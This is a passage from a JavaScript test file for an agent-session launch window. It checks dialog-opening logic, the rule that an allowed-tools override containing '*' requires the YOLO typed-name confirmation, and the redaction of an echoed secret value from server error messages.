  assert.deepEqual(readOf({ scope: null, current: null, error: "e" }), { action: "error", text: "e" });
  assert.equal(readOf({ scope: null, current: "session:a" }).action, "changed");
  assert.equal(readOf({ scope: "session:a", current: null }).action, "changed");
  assert.equal(readOf({ scope: null, current: "" }).action, "changed", "an empty key is not no selection");
  assert.equal(readOf({ scope: "", current: null }).action, "changed");
});

test("launchReadResult: keys are compared exactly, and a missing key never matches a different missing one", () => {
  for (const [scope, current] of [["session:a", "session:A"], ["session:a", "session:a "], ["session:a", " session:a"], ["flow:a", "session:a"], ["new-session:", "new-flow:"], [null, undefined], [undefined, null]]) {
    assert.equal(readOf({ scope, current }).action, "changed", `${JSON.stringify(scope)} -> ${JSON.stringify(current)}`);
  }
  assert.equal(readOf({ scope: "日本:x", current: "日本:x" }).action, "open");
  assert.equal(readOf({ scope: "s".repeat(10000), current: "s".repeat(10000) }).action, "open");
});

test("launchReadResult: the form counts as unchanged only when sameForm is exactly true", () => {
  for (const sameForm of [false, undefined, null, 0, 1, "", "true", "yes", [], {}, [true]]) {
    assert.deepEqual(readOf({ sameForm }), { action: "changed", text: CHANGED_TEXT }, JSON.stringify(sameForm));
  }
  assert.equal(readOf({ sameForm: true }).action, "open");
});

test("launchReadResult: with nothing to go on it never opens", () => {
  assert.equal(launch.launchReadResult().action, "changed");
  assert.equal(launch.launchReadResult({}).action, "changed");
  assert.equal(launch.launchReadResult({ scope: "a", current: "a" }).action, "changed");
  assert.equal(launch.launchReadResult({ error: "e" }).action, "changed");
});

test("launchReadResult: an answer has the action and, unless the dialog opens, a text; nothing else", () => {
  assert.deepEqual(Object.keys(readOf()), ["action"]);
  assert.deepEqual(Object.keys(readOf({ sameForm: false })).sort(), ["action", "text"]);
  assert.deepEqual(Object.keys(readOf({ error: "e" })).sort(), ["action", "text"]);
  assert.notEqual(readOf(), readOf(), "a new answer each time");
  const a = readOf({ sameForm: false });
  a.text = "changed by the caller";
  assert.equal(readOf({ sameForm: false }).text, CHANGED_TEXT);
});

test("launchReadResult changes nothing it is given, and gives the same answer twice", () => {
  const input = frozenDeep({ scope: "session:a", current: "session:a", sameForm: true, error: "no answer" });
  const first = launch.launchReadResult(input);
  assert.deepEqual(launch.launchReadResult(input), first);
  assert.deepEqual(input, { scope: "session:a", current: "session:a", sameForm: true, error: "no answer" });
  const loose = { scope: "session:a", current: "session:b", sameForm: false, error: "no answer" };
  launch.launchReadResult(loose);
  assert.deepEqual(loose, { scope: "session:a", current: "session:b", sameForm: false, error: "no answer" }, "an argument that can be changed is not changed");
});

test("Policy changed under a dialog: pressing Launch on one selection and moving away and back lets the dialog open; staying away does not", () => {
  const press = "new-session:";
  assert.equal(launch.launchReadResult({ scope: press, current: "new-session:", sameForm: true, error: null }).action, "open");
  assert.equal(launch.launchReadResult({ scope: press, current: "session:cao-x", sameForm: true, error: null }).action, "changed");
  assert.equal(launch.launchReadResult({ scope: press, current: null, sameForm: true, error: null }).action, "changed");
  assert.equal(launch.launchReadResult({ scope: null, current: null, sameForm: true, error: null }).action, "open", "both are no selection");
});

test("red case, launchReadResult: a read error whose text is empty is still an error, and the dialog does not open on it", () => {
  // the panel passes the error text of a failed read, which is "" when the server's detail was empty
  assert.deepEqual(readOf({ error: "" }), { action: "error", text: "" });
  assert.deepEqual(readOf({ error: "", current: "session:b" }), { action: "changed", text: CHANGED_TEXT }, "a moved selection still wins");
});

// ---- launchReadResult with dialogOpen: another open dialog counts as the form having changed ----

test("Form changed during the profile read: another dialog open when the read returns means no dialog opens, and the form says to press Launch again", () => {
  assert.deepEqual(readOf({ dialogOpen: true }), { action: "changed", text: CHANGED_TEXT });
});

test("launchReadResult: with no dialog open, or no word about one, nothing changes from before", () => {
  for (const dialogOpen of [false, undefined, null]) {
    assert.deepEqual(readOf({ dialogOpen }), { action: "open" }, String(dialogOpen));
    assert.deepEqual(readOf({ dialogOpen, error: "no answer" }), { action: "error", text: "no answer" }, String(dialogOpen));
    assert.deepEqual(readOf({ dialogOpen, sameForm: false }), { action: "changed", text: CHANGED_TEXT }, String(dialogOpen));
    assert.deepEqual(readOf({ dialogOpen, current: "session:b" }), { action: "changed", text: CHANGED_TEXT }, String(dialogOpen));
  }
  assert.deepEqual(readOf(), readOf({ dialogOpen: undefined }), "left out is the same as undefined");
  assert.equal(Object.hasOwn(launch.launchReadResult({ scope: "a", current: "a", sameForm: true }), "dialogOpen"), false);
});

test("launchReadResult: selection x form x dialog x error, every combination against a table written from the spec", () => {
  for (const scopeSame of [true, false]) {
    for (const formSame of [true, false]) {
      for (const dialogOpen of [undefined, false, null, true]) {
        for (const error of [null, "no answer"]) {
          const changed = !scopeSame || !formSame || dialogOpen === true;
          const expected = changed ? { action: "changed", text: CHANGED_TEXT } : error ? { action: "error", text: error } : { action: "open" };
          const got = launch.launchReadResult({ scope: "session:a", current: scopeSame ? "session:a" : "session:b", sameForm: formSame, dialogOpen, error });
          assert.deepEqual(got, expected, `selection same ${scopeSame}, form same ${formSame}, dialogOpen ${dialogOpen}, error ${error}`);
        }
      }
    }
  }
});

test("launchReadResult: an open dialog wins over a read error, so the error is not shown over the dialog that is open", () => {
  for (const error of ["no answer", "日本語", "x".repeat(10000), " "]) {
    assert.deepEqual(readOf({ dialogOpen: true, error }), { action: "changed", text: CHANGED_TEXT }, error.slice(0, 10));
  }
});

test("launchReadResult: the Launch dialog never replaces the discard dialog: with it open, nothing opens even when everything else still holds", () => {
  const r = readOf({ dialogOpen: true, error: null, sameForm: true, current: "session:a" });
  assert.notEqual(r.action, "open");
  assert.deepEqual(r, { action: "changed", text: CHANGED_TEXT });
});

test("launchReadResult: dialogOpen that is falsy (0, empty text, NaN) is no dialog", () => {
  for (const dialogOpen of [0, "", NaN]) assert.deepEqual(readOf({ dialogOpen }), { action: "open" }, String(dialogOpen));
});

test("launchReadResult: dialogOpen is not changed in the argument, and the answer is the same twice", () => {
  const input = frozenDeep({ scope: "session:a", current: "session:a", sameForm: true, dialogOpen: true, error: "no answer" });
  const a = launch.launchReadResult(input);
  assert.deepEqual(launch.launchReadResult(input), a);
  assert.equal(input.dialogOpen, true);
  const loose = { scope: "session:a", current: "session:a", sameForm: true, dialogOpen: true, error: null };
  launch.launchReadResult(loose);
  assert.deepEqual(loose, { scope: "session:a", current: "session:a", sameForm: true, dialogOpen: true, error: null });
});

test("red case, launchReadResult: any truthy dialogOpen is an open dialog, so a dialog is never replaced because its flag was not exactly true", () => {
  for (const dialogOpen of [1, "yes", "true", "Discard this form?", {}, [], { title: "Discard this form?" }, Symbol.for("open")]) {
    assert.deepEqual(readOf({ dialogOpen }), { action: "changed", text: CHANGED_TEXT }, String(typeof dialogOpen));
    assert.deepEqual(readOf({ dialogOpen, error: "no answer" }), { action: "changed", text: CHANGED_TEXT }, `${typeof dialogOpen} with an error`);
  }
});

// ---- an allowed-tools override that holds `*` is YOLO (spec cao-window-session-launcher, the override clause) ------
// `--allowed-tools '*'` lifts the profile's whole policy, which is what YOLO does, so whatever policy was chosen it
// needs the typed session name and the YOLO dialog. What counts: `*` as an item of the list, the way the server
// reads it (is_restricted: "*" in the list). The query joins the items with commas and parseToolList splits on
// commas and white space, so an item such as "fs_read, *" holds two tools, one of them `*`; spacing and case of the
// rest do not matter. A glob inside a name (`fs_*`, `mcp__x__*`) is a name and not `*`.
const STAR_OVERRIDES = [["*"], ["fs_read", "*"], ["*", "fs_read"], [" * "], ["\t*\n"], ["fs_read, *"], ["fs_read,*"], ["*,"], [",*"], ["fs_read", "x", "*", "y"], ["*", "*"], ["fs_read\n*"], ["fs_read *"]];
const YOLO_PLAN = { action: "dialog", dialog: "yolo" };

test("an allowed-tools override with * is YOLO under Ask first and under Auto-approve: the typed-name dialog opens, nothing is sent at once", () => {
  for (const policy of ["ask", "auto"]) {
    for (const allowedTools of STAR_OVERRIDES) {
      assert.deepEqual(launch.launchPlan(form({ policy, sessionName: "s1", allowedTools }), ctxOf()), YOLO_PLAN, `${policy} ${JSON.stringify(allowedTools)}`);
    }
  }
});

test("an allowed-tools override with * and no session name is blocked at the session name field, whatever the policy", () => {
  for (const policy of ["ask", "auto", "yolo"]) {
    for (const allowedTools of [["*"], ["fs_read", "*"], ["fs_read, *"]]) {
      const p = launch.launchPlan(form({ policy, sessionName: "", allowedTools }), ctxOf());
      assert.equal(p.action, "blocked", `${policy} ${JSON.stringify(allowedTools)}`);
      assert.equal(p.first.field, "sessionName");
      assert.match(p.first.message, /session name/i);
    }
  }
});

test("the session name field shows that problem: launchBlocked names it for an override with *, as it does for the YOLO policy", () => {
  const fields = (over) => launch.launchBlocked(form({ sessionName: "", ...over }), ctxOf()).problems.map((p) => p.field);
  assert.deepEqual(fields({ policy: "yolo" }), ["sessionName"]);
  for (const policy of ["ask", "auto"]) assert.deepEqual(fields({ policy, allowedTools: ["*"] }), ["sessionName"], policy);
});

test("launchConfirm of an override with *: only the typed-name YOLO dialog with the exact name sends, never the Ask-first dialog or a click", () => {
  for (const policy of ["ask", "auto"]) {
    for (const allowedTools of STAR_OVERRIDES) {
      const at = (kind, typed) => launch.launchConfirm(form({ policy, sessionName: "my-session", allowedTools }), kind, CTX, typed);
      const label = `${policy} ${JSON.stringify(allowedTools)}`;
      assert.deepEqual(at("yolo", "my-session"), SENT, label);
      assert.deepEqual(at("yolo", ""), { send: false, reason: "the typed name is not the session name" }, label);
      assert.deepEqual(at("yolo", "My-Session"), { send: false, reason: "the typed name is not the session name" }, label);
      assert.deepEqual(at("ask", ""), { send: false, reason: "the policy changed since the dialog opened" }, label);
      assert.deepEqual(at("auto", ""), { send: false, reason: "the policy changed since the dialog opened" }, label);
      assert.deepEqual(at("auto", "my-session"), { send: false, reason: "the policy changed since the dialog opened" }, `${label}: typing the name does not turn a click into the YOLO dialog`);
    }
  }
});

test("launchConfirm of an override with * and no session name sends nothing, even for the YOLO kind with nothing typed", () => {
  for (const policy of ["ask", "auto"]) {
    for (const kind of ["ask", "auto", "yolo"]) {
      const r = launch.launchConfirm(form({ policy, sessionName: "", allowedTools: ["*"] }), kind, CTX, "");
      assert.equal(r.send, false, `${policy} ${kind}`);
      assert.match(r.reason, /session name/i);
    }
  }
});

// An override that has no `*` of its own is not YOLO: a glob inside a name is the name of a tool, the server's
// is_restricted reads "*" in the list, and look-alike characters are not `*`.
const PLAIN_OVERRIDES = [["fs_*"], ["mcp__x__*"], ["*fs"], ["@cao-mcp-server"], ["fs_read", "execute_bash"], ["a*b", "*c", "d*"], ["**"], ["\uff0a"], ["\u2217"], ["\u2731"], ["fs_read,fs_*"], ["STAR"], [""]];

test("an allowed-tools override without * of its own stays an ordinary override: Ask first asks, Auto-approve sends, the session name is not needed", () => {
  for (const allowedTools of PLAIN_OVERRIDES) {
    assert.deepEqual(launch.launchPlan(form({ policy: "ask", sessionName: "", allowedTools }), ctxOf()), { action: "dialog", dialog: "ask" }, JSON.stringify(allowedTools));
    assert.deepEqual(launch.launchPlan(form({ policy: "auto", sessionName: "", allowedTools }), ctxOf()), { action: "send" }, JSON.stringify(allowedTools));
    assert.deepEqual(launch.launchConfirm(form({ policy: "ask", sessionName: "", allowedTools }), "ask", CTX, ""), SENT, JSON.stringify(allowedTools));
    assert.deepEqual(launch.launchConfirm(form({ policy: "auto", sessionName: "", allowedTools }), "auto", CTX, ""), SENT, JSON.stringify(allowedTools));
  }
});

test("no override at all (an empty list, null, undefined, a missing field) is not YOLO, and nothing throws", () => {
  for (const allowedTools of [[], null, undefined]) {
    const f = { ...form({ policy: "auto" }), allowedTools };
    assert.deepEqual(launch.launchPlan(f, ctxOf()), { action: "send" }, String(allowedTools));
    assert.deepEqual(launch.launchPlan({ ...f, policy: "ask" }, ctxOf()), { action: "dialog", dialog: "ask" }, String(allowedTools));
  }
  const { allowedTools, ...without } = form({ policy: "auto" });
  assert.equal(allowedTools.length, 0);
  assert.deepEqual(launch.launchPlan(without, ctxOf()), { action: "send" });
});

test("an override with * under the YOLO policy is the YOLO dialog it already was, and the policy's own rules still hold", () => {
  assert.deepEqual(launch.launchPlan(form({ policy: "yolo", sessionName: "s1", allowedTools: ["*"] }), ctxOf()), YOLO_PLAN);
  assert.deepEqual(launch.launchPlan(form({ policy: "yolo", sessionName: "s1", allowedTools: ["fs_*"] }), ctxOf()), YOLO_PLAN);
  assert.deepEqual(launch.launchConfirm(form({ policy: "yolo", sessionName: "s1", allowedTools: ["*"] }), "yolo", CTX, "s1"), SENT);
  assert.equal(launch.launchPlan(form({ policy: "yolo", sessionName: "", allowedTools: ["*"] }), ctxOf()).action, "blocked");
});

test("an override with * does not skip the other checks: a missing profile and a bad directory still block, first", () => {
  const p = launch.launchPlan(form({ policy: "auto", profile: "", workdir: "rel", sessionName: "s1", allowedTools: ["*"] }), ctxOf());
  assert.equal(p.action, "blocked");
  assert.deepEqual(p.problems.map((x) => x.field), ["profile", "workdir"]);
  assert.equal(launch.launchConfirm(form({ policy: "auto", profile: "", sessionName: "s1", allowedTools: ["*"] }), "yolo", CTX, "s1").send, false);
});

test("the launch request of an override with * still carries the star to the server, and a plain launch carries no override", () => {
  const sent = (over) => launch.buildRequest(form({ idempotencyKey: "k1", ...over }), ctxOf()).query.allowed_tools;
  assert.ok(sent({ policy: "ask", allowedTools: ["*"] }).split(",").includes("*"));
  assert.ok(sent({ policy: "auto", allowedTools: ["fs_read", "*"] }).split(",").includes("*"), "the star is still in the list the server reads");
  assert.equal(sent({ policy: "yolo", allowedTools: [] }), "*");
  assert.equal(sent({ policy: "ask", allowedTools: ["fs_*"] }), "fs_*");
  assert.equal(sent({ policy: "ask", allowedTools: [] }), undefined);
});

// ---- what a 422 that echoes a request body shows (the window sends no env value, but a server may echo one) ----

const SECRET_VALUE = "sk-live-5e7f1";
const echo422 = (loc) => JSON.stringify({ detail: [{ type: "value_error", loc, msg: "value is not valid", input: { env_vars: { K: SECRET_VALUE } }, ctx: { error: SECRET_VALUE } }] });
const answered = (status, body) => outcomeFrom({ stdout: `${body}\n${status}`, stderr: "", code: 0 });

test("launchOutcome of a 422 that echoes an env value in its input shows the field and the message, never the value", () => {
  for (const loc of [["body", "env_vars"], ["body", "env_vars", "K"], ["query", "agent_profile"], []]) {
    const result = launch.launchOutcome(answered(422, echo422(loc)), form({ sessionName: "s1", message: "hi", env: [{ key: "K", value: SECRET_VALUE }] }));
    assert.equal(result.type, "field", JSON.stringify(loc));
    assert.ok(!JSON.stringify(result).includes(SECRET_VALUE), `the value is in ${JSON.stringify(result)}`);
    assert.ok(result.message.includes("value is not valid"), "the server's message is still shown");
  }
});

test("launchOutcome of a 400, a 424 and a 5xx that carry the value somewhere in the body never returns it as text", () => {
  const f = form({ sessionName: "s1" });
  const bodies = [[400, JSON.stringify({ detail: "bad request", input: { env_vars: { K: SECRET_VALUE } } })], [424, JSON.stringify({ detail: "launch failed", terminal_id: "t1", input: { env_vars: { K: SECRET_VALUE } } })], [500, JSON.stringify({ detail: "boom", input: { env_vars: { K: SECRET_VALUE } } })]];
  for (const [status, body] of bodies) {
    const result = launch.launchOutcome(answered(status, body), f);
    assert.ok(!JSON.stringify(result).includes(SECRET_VALUE), `${status}: ${JSON.stringify(result)}`);
  }
});

await finish();
